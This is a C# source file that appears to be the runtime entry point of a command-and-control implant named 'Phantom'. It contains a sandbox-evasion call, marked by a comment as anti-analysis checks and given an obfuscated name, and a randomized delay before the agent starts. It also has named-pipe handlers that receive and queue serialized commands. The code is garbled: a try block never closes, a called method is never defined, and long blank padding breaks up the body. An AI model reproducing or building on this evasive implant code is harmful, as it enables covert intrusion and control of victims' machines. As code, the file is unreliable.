using System;
using PhantomInterop.Serializers;
using System.Collections.Generic;
using PhantomInterop.Classes;
using PhantomInterop.Interfaces;
using System.IO.Pipes;
using PhantomInterop.Structs.PhantomStructs;
using System.Text;
using System.Threading;
using System.Linq;
using System.Collections.Concurrent;
using PhantomInterop.Classes.Core;
using PhantomInterop.Classes.Events;
using PhantomInterop.Enums.PhantomEnums;
using System.Runtime.InteropServices;

namespace Phantom
{
    class Runtime
    {
        private static JsonHandler _dataSerializer = new JsonHandler();
        private static AutoResetEvent _msgRecvEvent = new AutoResetEvent(false);
        private static ConcurrentQueue<ICommandMessage> _msgRecvQueue = new ConcurrentQueue<ICommandMessage>();
        private static ConcurrentDictionary<string, ChunkStore<DataChunk>> DataStore = new ConcurrentDictionary<string, ChunkStore<DataChunk>>();
        private static AutoResetEvent _connectionActive = new AutoResetEvent(false);
        private static ConcurrentQueue<byte[]> _msgSendQueue = new ConcurrentQueue<byte[]>();
        private static Action<object> _transmitAction;
        private static CancellationTokenSource _stopToken = new CancellationTokenSource();
        private static AutoResetEvent _msgSendEvent = new AutoResetEvent(false);
        private static AutoResetEvent _taskComplete  = new AutoResetEvent(false);
        private static bool _isFinished;
        private static Action<object> _flushData;
        public static void J3m4n5o6(string[] args)
        {
            try
            {
                // Anti-analysis checks
                if (DateTime.Now.Year > 2020) 
                { 
                    X1a2b3c4.Evasion.H8i9j0k1.Q7w8e9r0();
                } 
                else 
                { 
                    return; 
                }
                
                // Delayed execution
                Thread.Sleep(Random.Shared.Next(2000, 5000));
                
                if (DateTime.Now.Year > 2020) 
                { 
                    StartAgent();
                } 
                else 
                { 
                    return; 
                }
            
            

            
            
            
            
            
            
            
            
            
            
            
            
            
            
            
            
            
            
            
            
            
            
            
            
            
            
            

            
            Agent.Phantom ap = new Agent.Phantom(Settings.AgentIdentifier);
            ap.Start();
        }

        private static void OnConnectionClosed(object sender, PipeMessageData e)
        {
            e.Pipe.Close();
            _taskComplete.Set();
        }

        private static void OnConnectionReady(object sender, PipeMessageData e)
        {
            System.Threading.Tasks.Task.Factory.StartNew(_transmitAction, e.Pipe, _stopToken.Token);
        }

        private static void ProcessSentMessage(IAsyncResult result)
        {
            PipeStream pipe = (PipeStream)result.AsyncState;
            
            if (pipe.IsConnected)
            {
                pipe.EndWrite(result);
                if (!_stopToken.IsCancellationRequested && _msgSendQueue.TryDequeue(out byte[] bdata))
                {
                    pipe.BeginWrite(bdata, 0, bdata.Length, ProcessSentMessage, pipe);
                }
            }
        }

        private static void ProcessReceivedMessage(object sender, PipeMessageData args)
        {
            IPCData d = args.Data;
            string msg = Encoding.UTF8.GetString(d.Data.Take(d.DataLength).ToArray());
            Console.Write(msg);
        }

        private static void HandleIncomingData(object sender, ChunkEventData<DataChunk> args)
        {
            MessageType mt = args.Chunks[0].Message;
            List<byte> data = new List<byte>();

            for (int i = 0; i < args.Chunks.Length; i++)
            {
                data.AddRange(Convert.FromBase64String(args.Chunks[i].Data));
            }

            ICommandMessage msg = _dataSerializer.DeserializeIPCMessage(data.ToArray(), mt);
            
            _msgRecvQueue.Enqueue(msg);
            _msgRecvEvent.Set();
        }
    }
}
